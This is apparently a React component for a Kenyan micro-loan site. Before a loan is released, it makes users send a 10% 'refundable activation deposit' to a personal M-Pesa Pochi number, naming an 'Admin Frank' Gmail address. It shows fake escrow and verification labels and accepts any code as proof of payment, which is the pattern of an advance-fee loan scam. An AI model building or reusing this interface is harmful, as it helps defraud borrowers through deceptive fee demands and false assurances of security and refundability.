import { useState, FormEvent, useEffect } from 'react';
import { X, ShieldCheck, CheckCircle2, Wallet, Smartphone, ArrowRight, Lock, Copy, Check } from 'lucide-react';
import { formatKES } from '../utils/loanUtils';
import { UserSession } from '../types';

interface DepositModalProps {
  isOpen: boolean;
  onClose: () => void;
  user: UserSession | null;
  selectedAmount: number;
  termDays: number;
  // This hook has been updated to support custom pending approval statuses
  onSuccessfullyApplied: (amount: number, termDays: number, depositTxCode: string) => void;
  onNavigateToRepay: () => void;
}

export default function DepositModal({
  isOpen,
  onClose,
  user,
  selectedAmount,
  termDays,
  onSuccessfullyApplied,
  onNavigateToRepay,
}: DepositModalProps) {
  const [stkState, setStkState] = useState<'idle' | 'pasting' | 'submitting' | 'success'>('idle');
  const [txRefCode, setTxRefCode] = useState('');
  const [copiedNumber, setCopiedNumber] = useState(false);
  const [txErrorMessage, setTxErrorMessage] = useState('');

  const companyPochiNumber = '0117051321';

  // Calculate fees dynamically
  const processingFee = Math.round(selectedAmount * 0.10); // 10% upfront fee
  const netDisbursed = selectedAmount - processingFee;
  const interest = Math.round(selectedAmount * 0.05); // 5% interest
  const totalRepay = selectedAmount + interest;

  useEffect(() => {
    if (isOpen) {
      setStkState('idle');
      setTxRefCode('');
      setTxErrorMessage('');
    }
  }, [isOpen]);

  if (!isOpen) return null;

  const handleCopyNumber = () => {
    navigator.clipboard.writeText(companyPochiNumber);
    setCopiedNumber(true);
    setTimeout(() => setCopiedNumber(false), 2000);
  };

  const handleStartPasting = () => {
    setStkState('pasting');
  };

  const handleSubmitTxRef = (e: FormEvent) => {
    e.preventDefault();
    setTxErrorMessage('');

    const formattedCode = txRefCode.trim().toUpperCase();
    if (formattedCode.length < 8 || formattedCode.length > 15) {
      setTxErrorMessage('Please specify a valid Safaricom M-Pesa 10-character transaction reference ID (e.g., RE48FDJ850)');
      return;
    }

    setStkState('submitting');
    setTimeout(() => {
      setStkState('success');
      // Execute the pending status disbursement in persistent memory
      onSuccessfullyApplied(selectedAmount, termDays, formattedCode);
    }, 1500);
  };

  return (
    <div className="fixed inset-0 bg-slate-900/60 backdrop-blur-md z-50 flex items-center justify-center p-4 overflow-y-auto animate-fade-in">
      <div className="bg-amber-50 border border-amber-200 w-full max-w-xl rounded-3xl p-6 md:p-8 space-y-6 shadow-premium text-slate-800 relative max-h-[92vh] overflow-y-auto">
        
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-5 right-5 h-8 w-8 rounded-full bg-white border border-slate-200 flex items-center justify-center hover:bg-slate-205 transition-colors cursor-pointer"
        >
          <X className="h-4 w-4 text-slate-650" />
        </button>

        {/* Header Title */}
        <div className="text-center space-y-2 mt-2">
          <div className="inline-flex items-center gap-1.5 px-3 py-1 bg-amber-100 border border-amber-200 rounded-full text-[10px] font-bold text-amber-850 uppercase tracking-wider font-mono">
            <ShieldCheck className="h-3.5 w-3.5 text-amber-700" />
            <span>Escrow Processing Fee Verification</span>
          </div>
          <h2 className="text-xl font-extrabold text-slate-900 tracking-tight">
            Activate Micro-Credit Principal Tier
          </h2>
          <p className="text-xs text-slate-500 leading-relaxed font-sans">
            To activate and disburse your borrowing capacity of <strong>{formatKES(selectedAmount)}</strong>, pay the required refundable upfront deposit to the corporate company ledger account below.
          </p>
        </div>

        {/* Loan Financial Breakdown metrics */}
        <div className="grid grid-cols-2 gap-4 bg-white p-4.5 border border-slate-200 rounded-2xl shadow-sm text-left">
          <div className="space-y-0.5">
            <span className="text-[10px] font-mono text-slate-400 uppercase tracking-wider block">Requested Loan</span>
            <span className="text-lg font-extrabold font-mono text-slate-800">{formatKES(selectedAmount)}</span>
            <p className="text-[9px] text-slate-500 font-sans">Refund Term: {termDays} Days</p>
          </div>

          <div className="space-y-0.5 border-l border-slate-100 pl-4">
            <span className="text-[10px] font-mono text-slate-450 uppercase tracking-wider block">Activation Deposit (10%)</span>
            <div className="inline-flex items-center gap-1.5">
              <span className="text-lg font-black font-mono text-red-600">{formatKES(processingFee)}</span>
            </div>
            <p className="text-[9px] text-emerald-650 font-bold font-sans">✔ Net credit disbursed: {formatKES(selectedAmount)}</p>
          </div>
        </div>

        {stkState === 'idle' && (
          <div className="space-y-5">
            {/* Step Wizard Box */}
            <div className="bg-white border border-amber-200 rounded-2xl p-5 text-left space-y-4">
              <span className="text-[10.5px] uppercase font-mono tracking-widest text-[#B58900] font-black block border-b border-stone-100 pb-1.5">
                EXECUTE MANUAL PAY STEPS:
              </span>

              <div className="space-y-3.5 text-xs text-slate-650 font-medium">
                <div className="flex gap-3">
                  <span className="h-5 w-5 rounded-full bg-slate-900 text-white flex items-center justify-center font-bold font-mono text-[10px] shrink-0">1</span>
                  <div className="space-y-1">
                    <p className="text-slate-800 font-bold font-sans">Go to your mobile handset M-Pesa Menu</p>
                    <p className="text-[11px] leading-relaxed text-slate-500 font-sans">Open Safaricom Toolkit or mySafaricom App and enter SIM services.</p>
                  </div>
                </div>

                <div className="flex gap-3">
                  <span className="h-5 w-5 rounded-full bg-slate-900 text-white flex items-center justify-center font-bold font-mono text-[10px] shrink-0">2</span>
                  <div className="space-y-1 flex-1">
                    <p className="text-slate-800 font-bold font-sans">Select Lipa na M-Pesa &rarr; Pochi la Biashara</p>
                    <p className="text-[11px] leading-relaxed text-slate-500 font-sans">
                      Enter the corporate Lipa na Pochi company number:
                    </p>
                    
                    {/* Clipboard Target block */}
                    <div className="flex items-center gap-2 mt-2">
                      <div className="bg-slate-100 border border-slate-250 rounded-lg px-3 py-1.5 font-mono text-slate-800 font-black tracking-wider text-xs">
                        {companyPochiNumber}
                      </div>
                      <button
                        type="button"
                        onClick={handleCopyNumber}
                        className="p-1 px-2 border border-slate-200 rounded-lg bg-white hover:bg-slate-50 transition-all font-mono text-[10px] font-bold text-slate-600 flex items-center gap-1 cursor-pointer"
                      >
                        {copiedNumber ? <Check className="h-3 w-3 text-emerald-600" /> : <Copy className="h-3 w-3" />}
                        <span>{copiedNumber ? 'Copied' : 'Copy'}</span>
                      </button>
                    </div>
                  </div>
                </div>

                <div className="flex gap-3">
                  <span className="h-5 w-5 rounded-full bg-slate-900 text-white flex items-center justify-center font-bold font-mono text-[10px] shrink-0">3</span>
                  <div className="space-y-1">
                    <p className="text-slate-800 font-bold font-sans">Send Activation Deposit of {formatKES(processingFee)}</p>
                    <p className="text-[11px] leading-relaxed text-slate-500 font-sans">Complete transaction by typing your standard private M-Pesa PIN.</p>
                  </div>
                </div>
              </div>
            </div>

            <button
              onClick={handleStartPasting}
              className="w-full bg-slate-900 text-white hover:bg-slate-850 font-extrabold py-4 rounded-xl text-xs uppercase tracking-wider transition-colors cursor-pointer shadow-lg font-sans flex items-center justify-center gap-2"
            >
              <span>I have sent KES {processingFee.toLocaleString()}</span>
              <ArrowRight className="h-4 w-4" />
            </button>
          </div>
        )}

        {stkState === 'pasting' && (
          <form onSubmit={handleSubmitTxRef} className="space-y-5 text-left">
            <div className="bg-white border border-amber-200 p-5 rounded-2xl space-y-4">
              <div className="space-y-1">
                <label className="text-[10px] font-mono uppercase tracking-wider text-slate-500 font-black block">
                  Paste Received M-Pesa Transaction Code
                </label>
                <div className="relative">
                  <input
                    id="user-tx-ref-input"
                    type="text"
                    required
                    maxLength={15}
                    value={txRefCode}
                    onChange={(e) => setTxRefCode(e.target.value)}
                    placeholder="e.g. RG84JDKF80"
                    className="w-full px-4 py-3 bg-slate-50 border border-slate-300 rounded-xl text-slate-800 font-mono tracking-widest text-sm focus:outline-none focus:border-amber-500 font-bold uppercase"
                  />
                </div>
                <span className="text-[9.5px] text-slate-450 leading-relaxed block font-sans">
                  Paste the official 10-character Safaricom code received in the SMS receipt after sending KES {processingFee.toLocaleString()} to Pochi line <strong>{companyPochiNumber}</strong>.
                </span>
              </div>

              {txErrorMessage && (
                <div className="bg-red-50 text-red-800 text-[11px] font-sans p-3 border border-red-200 rounded-xl font-medium leading-relaxed">
                  <strong>Verification Error:</strong> {txErrorMessage}
                </div>
              )}
            </div>

            <div className="flex gap-3">
              <button
                type="button"
                onClick={() => setStkState('idle')}
                className="px-4 py-3 border border-slate-250 hover:bg-slate-50 rounded-xl font-bold text-xs uppercase text-slate-600 transition-all font-sans cursor-pointer"
              >
                Back
              </button>
              
              <button
                type="submit"
                className="flex-1 bg-amber-600 hover:bg-amber-550 text-white font-extrabold py-3 rounded-xl text-xs uppercase tracking-wider font-sans cursor-pointer shadow-md flex items-center justify-center gap-2"
              >
                <span>Submit to Admin Frank for Approval</span>
              </button>
            </div>
          </form>
        )}

        {stkState === 'submitting' && (
          <div className="text-center py-8 space-y-4 font-sans">
            <div className="h-10 w-10 border-2 border-slate-300 border-t-amber-500 rounded-full animate-spin mx-auto"></div>
            <div className="space-y-1">
              <p className="text-xs text-slate-705 font-mono font-bold uppercase tracking-wider">Broadcasting ledger request...</p>
              <p className="text-[10px] text-slate-450 italic">Filing transaction code record on administrative queue...</p>
            </div>
          </div>
        )}

        {stkState === 'success' && (
          <div className="text-center py-6 space-y-5 animate-scale-up">
            <div className="h-16 w-16 bg-amber-100 border border-amber-300 rounded-full flex items-center justify-center mx-auto text-amber-600 shadow-md">
              <CheckCircle2 className="h-10 w-10" />
            </div>
            
            <div className="space-y-2">
              <h4 className="text-lg font-black uppercase tracking-wide text-slate-900 font-sans">
                Proposal Filed Successfully!
              </h4>
              <p className="text-xs text-amber-800 font-mono font-bold">
                M-Pesa Reference Ref: <span className="underline">{txRefCode.toUpperCase()}</span> has been loaded.
              </p>
              <p className="text-[11px] text-slate-500 max-w-sm mx-auto leading-relaxed pt-2 font-sans">
                Your loan disbursement request is in the pending approval queue. Admin Frank <strong>(frankjanal89@gmail.com)</strong> is auditing the processing fee transaction code on company wallet ledger <strong>{companyPochiNumber}</strong>. Approval generally requires 5-15 minutes!
              </p>
            </div>

            <div className="flex flex-col sm:flex-row gap-3 pt-4">
              <button
                onClick={onClose}
                className="flex-1 bg-slate-900 hover:bg-slate-850 text-white font-bold uppercase py-3.5 rounded-xl text-xs tracking-wider transition-colors cursor-pointer font-sans"
              >
                Go to Dashboard
              </button>
              <button
                onClick={() => {
                  onClose();
                  onNavigateToRepay();
                }}
                className="flex-1 bg-amber-100 hover:bg-amber-200 text-amber-900 font-bold uppercase py-3.5 rounded-xl text-xs tracking-wider transition-colors cursor-pointer font-sans"
              >
                Audits Dashboard &rarr;
              </button>
            </div>
          </div>
        )}

        {/* Security Disclaimers bottom panel */}
        <div className="flex items-center justify-center gap-1.5 text-[10px] text-slate-400 font-mono uppercase bg-white py-1 border border-stone-100 rounded-full">
          <Lock className="h-3 w-3" />
          <span>Verified By PesaSwift Escrow Clearing House</span>
        </div>

      </div>
    </div>
  );
}
